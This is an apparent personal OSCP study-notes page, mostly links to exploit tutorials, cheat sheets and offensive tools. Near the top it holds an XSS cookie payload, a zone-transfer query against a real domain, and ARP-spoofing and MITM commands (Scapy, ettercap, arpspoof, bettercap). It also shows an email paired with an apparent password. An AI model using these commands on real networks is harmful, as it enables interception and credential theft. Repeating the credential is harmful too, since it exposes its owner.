---
title: "Profesional certificado en seguridad ofensiva (OSCP)"
date: 2020-03-09T16:50:48-03:00
---

Profesional certificado en seguridad ofensiva (**OSCP**) es una certificación de ethical hacking ofrecida por Offensive Security que enseña metodologías de exámenes de penetración y utilizan herramientas incluyendo el examen de pentración BackTrack (ahora realizado con éxito con la distribución Kali Linux)1​2​ La certificación OSCP consiste en un examen práctico que requiere atacar y penetrar de manera satisfactoria varias maquinas en un ambiente seguro controlado.3​ Actualmente, es una de las pocas certificaciones que requiere evidencia de las habilidades en la parte práctica que consiste en una prueba de penetración.

## Referencias que veo para prepararme

- shi_ver_bot : A Telegram bot to see if your password was in the BreachCompilation

beef project

sitio de boca buscar alert(document.cookie)\</script\>

<https://www.netcraft.com/>

<https://www.seleniumhq.org/>

<https://panopticlick.eff.org/>

<https://beefproject.com/>

dig @200.111.157.67 unap.cl -t AXFR

<https://www.acunetix.com/>

<https://github.com/1N3/Sn1per>

portnocking

<https://blog.wpscans.com/sniff-wordpress-login-credentials-wireshark-http-connection/>

<https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/> <https://kali.training/lessons/introduction/>

<https://kali.training/topic/introduction-to-kali-linux/>

<https://www.offensive-security.com/information-security-certifications/oswe-offensive-security-web-expert/> <https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/> <https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/>

<https://smarterworkspaces.kyocera.es/blog/certificacion-seguridad-informatica-cuales-las-principales/>

(ip.addr == 10.168.40.145) and (!udp contains “HTTP/1.1”)

<https://tools.kali.org/information-gathering/nmap>

ip.src == 192.168.0.99 && tcp.flags.syn==1 && tcp.flags.ack==1

<https://3.14.by/en/md5>

<https://github.com/alearea51/IKn0wU>

<https://github.com/TunisianEagles/SocialBox>

<https://github.com/gentilkiwi/mimikatz> <https://github.com/AlessandroZ/LaZagne>

<https://github.com/reconSF/python/blob/master/Syngress.Violent.Python.a.Cookbook.for.Hackers.2013.pdf>

<https://github.com/vk496/linset>

<https://foro.seguridadwireless.net/manuales-de-wifislax-wifiway/manual-basico-de-wifislax-y-sus-herramientas-de-auditoria/>

<https://github.com/WifiPhisher>

<https://github.com/xtr4nge/FruityWifi>

scapy

> > > a = ARP(op=“who-has”, psrc=“192.168.168.2”, pdst=“192.168.168.131”, hwdst=“fe80::4067:2e3f:d06:61bd”)

> > > send(a, inter=3, loop=1)

a = ARP(op=“who-has”, psrc=“10.168.40.1”, pdst=“10.168.40.70”, hwdst=“fe80::4067:2e3f:d06:61bd”)

10.168.40.1

ip a falsear ip victima mac victima a = ARP(op=“who-has”, psrc=“10.168.40.1”, pdst=“10.168.40.70”, hwdst=“08:00:27:52:2D:A0”)

> > > send(a, inter=3, loop=1)

ettercap

```
ettercap -T -q -i eth0 -P dns_spoof -M arp /10.168.40.145/// 
```

tcpdump -n -i wlan0 -e ‘arp or icmp’

arping -c 1 -I wlan0 10.168.40.1 ARPING 10.168.40.1 60 bytes from 08:00:27:7e:b5:f7 (10.168.40.1): index=0 time=1.363 msec 60 bytes from 00:17:c5:15:81:6a (10.168.40.1): index=1 time=2.670 msec

— 10.168.40.1 statistics —

<https://sandilands.info/sgordon/arp-spoofing-on-wired-lan>

mitmproxy

arpspoof -i eth0 -t 10.168.40.70 10.168.40.1

iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080 iptables -t nat -A PREROUTING -p tcp –destination-port 443 -j REDIRECT –to-port 8080

mitmproxy –mode transparent

---
bettercap -T ipvictima –proxy -P

<https://github.com/byt3bl33d3r/MITMf> <https://backtrackacademy.com/articulo/saltando-hsts-con-man-in-the-middle-framework> <http://www.elladodelmal.com/2016/03/ataques-man-in-middle-hsts-sslstrip-2.html>

<https://www.trustwave.com/Resources/SpiderLabs-Blog/Changes-in-Oracle-Database-12c-password-hashes/>

w2af <http://exploitpack.com/>

---
WIFI

<https://github.com/xtr4nge/FruityC2>

---
android <https://github.com/M4sc3r4n0/Evil-Droid>

extra

<https://github.com/nixawk/pentest-wiki>

<https://geekflare.com/online-scan-website-security-vulnerabilities/>

otra

<https://es.scribd.com/document/13213787/CUH-E-zine-4%C2%AA-Edicion>

<https://www.aircrack-ng.org/doku.php?id=es:aireplay-ng> <https://www.aircrack-ng.org/doku.php?id=es:deauthentication>

<https://www.offensive-security.com/metasploit-unleashed/>

<https://blog.segu-info.com.ar/2018/09/examen-de-prueba-para-estudiantes-del.html> <https://www.alienvault.com/blogs/security-essentials/how-to-prepare-to-take-the-oscp>

OSCP

<https://www.sniferl4bs.com/2015/11/entrenando-en-casa-para-rendir-el-oscp.html> <https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-1-is-oscp-for-you-b57cbcce7440> <https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48> <https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97>

<https://support.offensive-security.com/#!pwk-support.md> <https://support.offensive-security.com/#!oscp-exam-guide.md>

<https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf> <https://www.securitysift.com/offsec-pwb-oscp/> <https://www.adampalmer.me/iodigitalsec/2013/04/11/offensive-security-pwb-course-and-oscp-certification-review/>

<https://vcatalan.com/2017/01/OSCP-part-I-preparacion-estudio-previo.html>

<https://mytcpip.com/2017/08/10/taller-de-hacking-i-nmap-a-fondo-metasploit-basico/> <https://null-byte.wonderhowto.com/forum/upload-shell-from-phpmyadmin-xampp-by-mohamed-ahmed-0179931/>

<https://www.exam-labs.com/exam/NSE4#tutorial>

<https://www.ihacklabs.com/es/el-mejor-sistema-de-pivoting-en-linux/>

<https://wiki.wireshark.org/SampleCaptures>

<https://www.ubuntupit.com/an-ultimate-list-of-ethical-hacking-and-penetration-testing-tools-for-kali-linux/?fbclid=IwAR2szRvngTnDw8X7sETTlDH7letMnJriTBNSWYe_P4t49VVScqdxS2gWhV8>

<https://openwall.info/wiki/>

<https://github.com/ibr2/pwk-cheatsheet>

<https://www.keiththome.com/oscp-course-review/>

<http://fl3x.us/blog/2015/09/22/order-wireless-devices-for-wifu-course/>

<https://amonsec.net/course/offensive-security-pwk-course-review>

<https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/>

<https://www.ihacklabs.com/es/certificacion-osce-review-cracking-the-perimeter-ctp/>

<http://www.vividmachines.com/shellcode/shellcode.html>

<https://www.securitysift.com/offsec-ctp-osce/>

<https://hackforums.net/member.php> cayuqueo@gmail.com EBM1JUD1yq57pmgUAiqHQ

<http://nixware.net/my-osce-journey>

<http://www.cs.virginia.edu/~evans/cs216/guides/x86.html>

<https://www.pentesteracademy.com/topics>

<https://openwall.info/wiki/p_lkrg/Main>

<https://github.com/tanc7/hacking-books>

<https://github.com/tanc7>

<https://infosecuritygeek.com/vulnhub-kioptrix-2014/>

<http://www.securitysift.com/offsec-pwb-oscp/>

<https://xapax.gitbooks.io/security/content/>

<https://medium.com/@bondo.mike/ptp-lab-privilege-escalation-with-services-5d14a99a28d1>

<https://github.com/xapax/oscp>

<https://medium.com/@m4lv0id/and-i-did-oscp-589babbfea19>

Cupp para crear diccionarios git clone <https://github.com/Mebus/cupp.git>

Generar ataques de Bruteforce a redes sociales git clone <https://github.com/TunisianEagles/SocialBox.git>

Dump de passwords (Volcado de memoria) <https://github.com/AlessandroZ/LaZagne>

Cracking WPA/WPA2 con phishing <https://github.com/vk496/linset> <https://github.com/wifiphisher/wifiphisher>

instabridge

–mode transparent

mitm.it/cert/p12

bettercap -T \[ip_victima\] –proxy -P

Evil-Droid git clone <https://github.com/M4sc3r4n0/Evil-Droid.git>

<https://www.giuspen.com/cherrytree/>

<https://github.com/mikaelkall/HackingAllTheThings>

<https://www.vortex.id.au/2017/05/oscp-exam-preparation-exam-day-report-day/>

<https://github.com/P3t3rp4rk3r/OSCP-cheat-sheet-1>

<https://github.com/so87/OSCP-PwK>

<https://medium.com/@chennylmf/hackthebox-lame-c28b19558cb0>

<https://github.com/OlivierLaflamme/Cheatsheet-God>

<https://medium.com/@cymtrick/oscp-cheat-sheet-5b8aeae085ad>

<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>

<https://medium.com/@chennylmf/hackthebox-walkthrough-tartarsauce-810a8df296c1>

<https://www.giuspen.com/cherrytree/>

<http://www.fuzzysecurity.com/tutorials/16.html>

Good reviews of CTP/OSCE (in no particular order):

Note: \* mark means look for other posts on this blog

- <https://www.jollyfrogs.com>
- <http://www.securitysift.com/offsec-ctp-osce/>
- <http://buffered.io/posts/osce-and-me/>
- <http://www.iodigitalsec.com/offensive-security-ctp-course-and-osce-certification-review/>
- <http://ethicalhacker.io/post/137403906740/osce-exam-prep>
- <https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/>
- <https://infamoussyn.com/resources/>
- <http://www.vividmachines.com/shellcode/shellcode.html>
- <http://www.primalsecurity.net/course-review-osce/>
- <http://netsec.ws/?p=517>
- <http://tekwizz123.blogspot.sg/2014/09/osce-review-and-experience.html>
- <https://networkfilter.blogspot.sg/2016/01/my-osce-review.html>
- <https://www.blogtecnico.net/certificacion-osce-review-cracking-the-perimeter-ctp/>
- <https://github.com/reider-roque>
- <http://shell-storm.org/shellcode/>

Tutorial sites (more stars = better/recommended):

- <https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/>
- <http://www.0daysecurity.com/pentest.html>
- <http://ly0n.me/2015/10/19/lfi-beyond-procselfenviron/>
- <http://phrack.org/issues/62/7.html>
- <http://0xdabbad00.com/2012/12/09/hurdles-for-a-beginner-to-exploit-a-simple-vulnerability-on-modern-windows/>
- <https://community.rapid7.com/community/metasploit/blog/2012/07/05/part-1-metasploit-module-development--the-series>
- <http://resources.infosecinstitute.com/intro-to-fuzzing/>
- <https://madmantm.wordpress.com/>
- <https://www.fuzzysecurity.com/tutorials.html>
- <https://www.corelan.be/index.php/2010/03/27/exploiting-ken-ward-zipper-taking-advantage-of-payload-conversion/>
- <http://netsec.ws/?p=180>
- <http://netsec.ws/?p=430>
- <http://netsec.ws/?cat=57>
- <http://blog.stalkr.net/2011/04/pctf-2011-22-hashcalc1.html>
- <https://ionize.com.au/its-all-about-inclusion/>
- <https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/>
- <https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/>
- <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>
- <https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/>
- <https://sites.google.com/site/xssvulnerabilities/bypassing-browser-anti-xss-filters>
- <http://carnal0wnage.attackresearch.com/>
- <https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/>
- <https://www.kernel-exploits.com/>
- <http://www.thegreycorner.com/2010/01/seh-stack-based-windows-buffer-overflow.html>
- <http://www.thegreycorner.com/2010/02/windows-buffer-overflow-tutorial.html>
- <http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html>
- <https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/>
- <https://www.corelan.be/index.php/2010/03/27/exploiting-ken-ward-zipper-taking-advantage-of-payload-conversion/>
- <https://www.corelan.be/index.php/2010/03/27/quickzip-stack-bof-0day-a-box-of-chocolates/>
- <https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/>
- <https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/>
- <https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/>
- <https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/>
- <https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/>
- <https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/>
- <https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/>
- <https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/>
- <https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/>
- <https://www.corelan.be/index.php/2010/01/26/starting-to-write-immunity-debugger-pycommands-my-cheatsheet/>
- <https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/>
- <https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/>
- <https://sites.google.com/site/xssvulnerabilities/bypassing-browser-anti-xss-filters>
- <https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/>
- <https://github.com/sploitfun/lsploits>
- <http://blog.pusheax.com/2013/03/exploit-writing-stack-based-buffer.html>
- <http://www.keystone-engine.org/docs/tutorial.html>
- <http://resources.infosecinstitute.com/analysis-of-malware-samples/>
- <http://www.fuzzysecurity.com/tutorials/7.html>
- <https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/>
- <http://phrack.org/issues/67/13.html>
- <http://www.securepla.net/>
- <http://programming4.us/security/688.aspx>
- <http://resources.infosecinstitute.com/buffer-overflow-vulnserver/>
- <http://www.primalsecurity.net/0x8-exploit-tutorial-the-elusive-egghunter/>
- <https://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/>
- <http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/>
- <http://realpentesting.blogspot.sg/2013/04/0day-bug-hunting-realpentesting.html>
- <https://samsclass.info/127/proj/vuln-server.htm>
- <http://www.rockfishsec.com/2014/01/fuzzing-vulnserver-with-peach-3.html>
- <http://www.thegreycorner.com/p/vulnserver.html>
- <http://resources.infosecinstitute.com/seh-exploit/>
- <https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/>

Cheatsheets:

- <https://highon.coffee/blog/lfi-cheat-sheet/>
- <http://ethicalhacker.io/post/137403906740/osce-exam-prep>
- <https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>
- <http://htmlpurifier.org/live/smoketests/xssAttacks.php>
- <https://www.bnxnet.com/wp-content/uploads/2015/01/WinAPIs_for_hackers.pdf>
- <http://www.securepla.net/wiki/index.php?title=Cheat_Sheets>
- <http://www.securepla.net/wiki/index.php?title=Network_Attack_Cheat_Sheet>
- <https://www.securepla.net/wiki/index.php?title=Web_App_Cheat_Sheet>
- <http://www.securepla.net/wiki/index.php?title=Web_Scanning_Cheat_Sheet>
- <http://www.securepla.net/wiki/index.php?title=Malware_Cheat_Sheet>
- <http://sparksandflames.com/files/x86InstructionChart.html>

Good practice sites:

- <http://www.primalsecurity.net/tutorials/exploit-tutorials/>
- <http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/>
- <https://v00d00sec.com/2015/09/14/manually-backdooring-windows-executables/>
- <https://www.corelan.be/index.php/articles/>
- <http://fuzzysecurity.com/tutorials.html>
- <http://exploit-exercises.com/protostar>
- <http://exploit-exercises.com/fusion>
- <http://ihazomgsecurityskillz.blogspot.com/>
- <http://opensecuritytraining.info/Training.html>
- <https://trailofbits.github.io/ctf/index.html>
- <http://tuts4you.com/download.php?list.17>
- <http://tuts4you.com/download.php?list.29>
- <http://tuts4you.com/download.php?list.3>
- <http://www.openrce.org/downloads/>
- <http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html>
- <http://tuts4you.com/download.php?list.67>
- <http://www.binary-auditing.com/>
- <https://blog.g0tmi1k.com/dvwa/index/>
- <http://www.vividmachines.com/shellcode/shellcode.html>
- <https://www.exploit-db.com/exploits/17527/>
- <https://www.exploit-db.com/exploits/11834/>
- <https://www.exploit-db.com/exploits/11872/>
- <https://www.exploit-db.com/exploits/11764/>
- <https://www.exploit-db.com/exploits/11656/>
- <https://www.exploit-db.com/exploits/33453/>
- <https://github.com/WebGoat/WebGoat>
- <http://www.gironsec.com/blog/2016/06/backdooring-a-dll/>
- <http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/>
- <https://www.offensive-security.com/0day/quick-tftp-poc.py.txt>
- <https://www.exploit-db.com/author/?a=278>
- <https://samsclass.info/127/proj/p4-lbuf-shell.htm>
- <http://www.securitysift.com/windows-exploit-development-part-1-basics/>
- <https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/>
- <https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/>
- <http://www.vividmachines.com/shellcode/shellcode.html>

Vulnerable machines: vulnhub VMs: SickOS 1.1 SickOS 1.2 Droopy v0.2 Kevgir Pegasus SecTalks: BNE0x00 - Minotaur SecTalks: BNE0x03 - Simple NullByte: 1 FristiLeaks 1.3 OWASP Vulnerable Web Applications Directory Project Mutillidae Damn Vulnerable Web Application

LFI/RFI <https://penetrate.io/2014/01/10/from-rfi-to-shell/>

Backdooring files with Python: <https://github.com/secretsquirrel/the-backdoor-factory>

eBooks downloads: <http://www.ebook777.com/gray-hat-hacking-ethical-hackers-handbook-fourth-edition/> <https://github.com/JpGallegos/CySecBooks> <https://www.securepla.net/the-hacker-playbook-2/> “Hacking: The Art of Exploitation”

<https://www.linkedin.com/pulse/osce-cracking-perimeter-experience-sunny-neo> - Fuzzing (Scapy, TAO, Sulley) - Linux Exploitation (vanila stack overflow, return to Glibc - NX bypass, repairing stack canaries, ASLR bypasses) and Windows exploitation (SEH overwrite, Return Oriented Programming into disabling DEP) - Web Application Hacker’s Handbook (might be too large: Consider “webgoat”)

Various sites: <http://www.sweetscape.com/> (010 Editor) <https://github.com/campagnola/pycca> <https://github.com/Gallopsled/pwntools> <https://github.com/reyammer/shellnoob> <https://zeltser.com/convert-shellcode-to-assembly/> <http://files.cnblogs.com/files/exclm/ollydbg_cmdline_cheat_sheet.pdf> <http://bernardodamele.blogspot.sg/2011/09/reverse-shells-one-liners.html> <https://www.digitalocean.com/community/tutorials/how-to-use-bash-history-commands-and-expansions-on-a-linux-vps> <https://github.com/peterferrie/win-exec-calc-shellcode> <http://www.secniu.com/why-my-shellcode-cannot-work/> <http://thestarman.pcministry.com/asm/2bytejumps.htm> <http://blog.noobroot.com/> <https://www.exploit-db.com/exploits/5342/> <http://exploit.co.il/hacking/manual-egghuntershellcode-encoding/> <https://github.com/salcho/codetz> <http://xangosec.blogspot.sg/2014/08/automating-sub-encoder.html> <http://www.fuzzing.org/> <http://resources.infosecinstitute.com/pattern-based-approach-memory-shellcodes-detection/> <https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/> <https://0x41.no/hacking-networks-with-snmp/> <http://danielebellavista.blogspot.sg/2014/10/ia32-shellcodes-get-eip-value.html> <http://www.thepentesters.net/tutorials/tricks-escaping-linux-restricted-shells/> <http://codemachine.com/downloads.html>

Fun random stuff: <http://patriciopalladino.com/files/hieroglyphy/> <http://n01g3l.tumblr.com/> <https://twitter.com/ch3rn0byl/status/832681279900487680>

<https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/>

<https://blog.g0tmi1k.com/2012/01/hackademic-rtb2/>

<https://github.com/vanhoefm/modwifi> <https://github.com/vanhoefm/blackhat17-pocs>

<https://github.com/0x90/uberscapy>

<https://github.com/0x90/wifi-arsenal> <https://github.com/0x90/kali-scripts>

<https://nets.ec/Main_Page> <https://old.exploit-db.com/exploits/13284/>

<https://packetstormsecurity.com/files/90146/Ascii-To-Shellcode-Encoder-Decoder-Tool.html>

<https://underc0de.org/foro/hacking/que-es-una-shellcode/>

<https://0x00sec.org/t/linux-shellcoding-part-1-0/289>

<https://packetstormsecurity.com/files/90146/Ascii-To-Shellcode-Encoder-Decoder-Tool.html>

<https://github.com/Grazfather/PracticalMalwareLabs> <https://github.com/Grazfather/BlackHatPython>

<https://github.com/VulnHub/ctf-writeups>

<https://nullku7.github.io/stuff/vulnhub/walkthrough/2017/05/28/vulnhub-mr-robot.html>

<https://github.com/trustedsec>

<https://exploit.courses/#/challenges>

<https://payatu.com/guide-linux-privilege-escalation/>

<https://github.com/dobin/yookiterm-slides>

<https://exploit.courses/files/bfh2018/content.html>

<https://exploit.courses/files/bfh2017/content.html>

<https://systemoverlord.com/2017/10/24/building-a-home-lab-for-offensive-security-basics.html#pre-made-vms-tools>

- <https://github.com/xairy/linux-kernel-exploitation>

<https://blog.vonhewitt.com/2018/08/oscp-exam-cram-log-aug-sept-oct-2018/>

<https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/>

<https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html>

<https://www.exploit-db.com/exploits/44298>

<https://github.com/jivoi/pentest>

<https://github.com/lucyoa/kernel-exploits>

<https://n0where.net/>

<https://github.com/Manisso/fsociety>\
Fsociety Hacking Tools Pack. A Penetration Testing Framework, you will have every script that a hacker needs

Linux Kernel-Mode Rootkit Hunter for 4.4.0-31+. <https://github.com/nbulischeck/tyton> <https://nbulischeck.github.io/tyton/>

<https://github.com/fireeye/flare-vm> - FLARE VM - a fully customizable, Windows-based security distribution for malware analysis, incident response, penetration testing, etc.

<https://n0where.net/>

<https://github.com/frizb/Vanquish>\
Vanquish is a Kali Linux based Enumeration Orchestrator built in Python. Vanquish leverages the opensource enumeration tools on Kali to perform multiple active information gathering phases. The results of each phase are fed into the next phase to identify vulnerabilities that could be leveraged for a remote shell.

<https://www.youtube.com/watch?v=YoNrNBnmwuY&feature=youtu.be>

<https://github.com/coreb1t/awesome-pentest-cheat-sheets>

<https://www.oracle.com/technetwork/community/developer-vm/index.html>

<https://github.com/buglessdr?tab=repositories>

<https://github.com/buglessdr/oscp-1>

<https://github.com/buglessdr/myarsenal>

<https://github.com/buglessdr/linux-exploit-suggester>

<https://github.com/buglessdr/OSCP-2>

<https://github.com/pentestmonkey>

<https://www.peerlyst.com/posts/ctf-virtual-machines-created-by-the-peerlyst-community-hack-these-peerlyst>

<https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki>

<https://github.com/ston3o/docker-hacklab>

<https://gist.github.com/jivoi/724e4b4b22501b77ef133edc63eba7b4>

<http://overthewire.org/wargames/>

<https://github.com/SecWiki/linux-kernel-exploits>

<https://www.pcihispano.com/cumplir-con-pci-dss-solamente-con-software-open-source-es-posible-aqui-te-explicamos-como-hacerlo/>

<https://opnsense.org/download/>

<https://www.peerlyst.com/posts/the-red-team-guide-chapter-11-privilege-escalation-haythem-arfaoui?utm_source=peerlyst_perspective&utm_medium=email&utm_content=peerlyst_post&utm_campaign=top_posts_on_peerlyst_this_week_01292019>

<https://github.com/thelinuxchoice?tab=repositories>

<https://pastebin.com/aqGvjhgB>

<https://github.com/osirislab/Hack-Night/>

<http://www.opensecuritytraining.info/Exploits1.html>

<http://www.opensecuritytraining.info/Exploits2.html>

<https://www.bebee.com/producer/@fran-brizzolis/ciberseguridad-en-pymes-administrando-sistemas-de-forma-segura-buenas-practicas>

<https://picoctf.com/resources>

<https://blog.osiris.cyber.nyu.edu/>

<https://www.hacker101.com/videos>

<https://cyb3rsick.com>

<https://github.com/slyth11907/Cheatsheets>

<https://pastebin.com/kdc6th08>

<http://www.fuzzysecurity.com/index.html>

<https://community.infosecinstitute.com/discussion/110760>

<https://www.lastline.com/labsblog/unmasking-kernel-exploits/>

<https://github.com/SecWiki/linux-kernel-exploits>

<https://www.exploit-db.com/papers/42803>

<https://www.exploit-db.com/papers/15823>

<https://www.exploit-db.com/papers/18074>

<https://github.com/nil0x42/phpsploit>

<https://www.peerlyst.com/posts/resource-learning-how-to-reverse-malware-a-guide?utm_source=peerlyst_perspective&utm_medium=email&utm_content=peerlyst_post&utm_campaign=special_digest_03032019>

<http://malware-traffic-analysis.net/2013/11/29/index.html>

<https://securedorg.github.io/RE101/> Reverse Engineering Malware 101

<https://systemoverlord.com/2019/03/15/certifications-arent-as-big-a-deal-as-you-think.html> <https://systemoverlord.com/2017/10/24/building-a-home-lab-for-offensive-security-basics.html> <https://www.vulnhub.com/lab/> <https://kb.help.rapid7.com/docs/setting-up-a-penetration-testing-lab> <https://amanhardikar.com/mindmaps/Practice.html>

<https://systemoverlord.com/2018/10/30/understanding-shellcode-the-reverse-shell.html>

<https://ironhackers.es>

<https://thehackerway.com/2012/11/20/mi-experiencia-sobre-offensive-security-certified-professional-oscp/#more-2055>

<https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html>

<https://www.youtube.com/watch?v=l_1ZtAuCjLk&feature=youtu.be>

Search engines :

<https://censys.io/> <https://www.shodan.io/> <https://viz.greynoise.io/table> <https://www.zoomeye.org/> <https://wigle.net/> <https://publicwww.com/> <https://hunter.io/> <https://haveibeenpwned.com/> <https://pipl.com/> <https://osintframework.com/>

<http://www.websecgeeks.com/2017/04/pentesting-nodejs-application-nodejs.html>

<https://411hall.github.io/OSCP-Preparation/> <https://guide.offsecnewbie.com/cherrytree-oscp-template> <https://guide.offsecnewbie.com/>

<http://ethicalredteam.com/oscp.php> <https://blackwintersecurity.com/oscp/>

<https://dradisframework.com/academy/industry/compliance/oscp/>

<http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet> <http://pentestmonkey.net/>

<https://www.peerlyst.com/posts/tips-for-an-information-security-analyst-pentester-career-ep-71-web-app-pentesting-practice-mattia-campagnano-13-years-experience-akron-oh?utm_source=peerlyst_perspective&utm_medium=email&utm_content=peerlyst_post&utm_campaign=special_digest_04072019>

<https://github.com/besimorhino/powercat>

<https://justhackerthings.com/post/my-oscp-workflow/>

<https://clintonmetu.com/2018/06/how-i-prepared-for-the-pwk-course-and-oscp-exam-oscp-exam-review/>

<https://github.com/codingo/Reconnoitre>

<https://seguridadyredes.wordpress.com/2010/04/05/wireshark-captura-conversaciones-voip-protocolo-sip-sdp-y-rtp-extraccion-de-audio/>

wiki con cosas

<https://blog.m0noc.com/>

CFT <http://www.fc4.me/>

<https://ctf.sec.army/resources>

<https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/>

<https://pentestlab.blog/>

<https://0x09al.github.io/security/ctp/osce/exploitation/2017/07/06/osce-ctp-prep-heapspreay-seh-egghunter.html>

<https://www.hacktoday.io/>

<https://www.hacktoday.io/t/journey-of-getting-oscp-certificatio/2496>

<https://github.com/NeuronAddict/pentesting-notes>

<https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob>

<https://github.com/vitalysim/Awesome-Hacking-Resources>

<https://github.com/hugsy/gef>

<https://www.offensive-security.com/information-security-training/>

<https://github.com/andyacer/ms08_067>

<https://github.com/andyacer/pentest>

<https://cexplr.github.io/>

<https://www.shogunlab.com/blog/>

<https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice>

---
<https://stacktrac3.co/category/osce-prep/> <https://github.com/s7acktrac3/OSCE-Exploit-Scripts> <https://github.com/s7acktrac3/PHP-Cheatsheet-Script>

<https://www.fuzzysecurity.com/tutorials/expDev/1.html>

<https://www.abatchy.com/2017/03/osce-study-plan>

<https://github.com/NeuronAddict/pentesting-notes>

1\. Censys.io 2. Shodan.io 3. Viz.Greynoise.io/table 4. Zoomeye.org 5. Fofa.so 6. Onyphe.io 7. App.binaryedge.io 8. Hunter.io 9. Wigle.net 10. Ghostproject.fr

<https://cybexsec.es/>

<https://github.com/Shiva108/CTF-notes>

<https://github.com/rebe11ion/CTFs/blob/master/HackTheBox-RE.md>

<https://0x00sec.org/>

<https://paumunoz.tech/2018/01/11/reversing-c-code-with-ida-part-i/>

<http://aboureada.com/oscp/2017/12/07/oscp_course_layout.html> <http://aboureada.com/cheat_sheet/2017/12/20/radare2_cheat_sheet.html>

<http://aboureada.com/buffer_overflow/2017/12/20/solving-backdoor-echo.html>

<http://aboureada.com/buffer_overflow/2017/12/19/exploiting_protostar_stack4.html>

<https://paumunoz.tech/2015/06/06/hacking-series-kioptrix-level-2/>

<https://jhalon.github.io/OSCP-Review/>

<https://github.com/RustyShackleford221/OSCP-Prep>

<https://www.jpsecnetworks.com/week-8-oscp-preparation-exploit/>

<https://honeysec.blogspot.com/2019/05/writeup-challenge-linux-201-by-1r0dm448o.html>

<https://ired.team>

<https://typora.io/#linux>

<https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/>

<https://www.sec.army/webcasts>

<https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html>

<https://www.peerlyst.com/posts/the-how-to-get-the-oscp-certification-wiki-peerlyst>

<https://www.peerlyst.com/posts/ctf-write-ups-wiki-peerlyst>

<https://www.peerlyst.com/posts/oscp-prep-kioptrix-5-walkthrough-video-cristi-vlad?utm_source=Mandrill&utm_medium=email&utm_campaign=invitation-to-chime-in-on-a-post-by-system>

<https://shellterlabs.com/en/>

<https://nvd.nist.gov/>

reviews

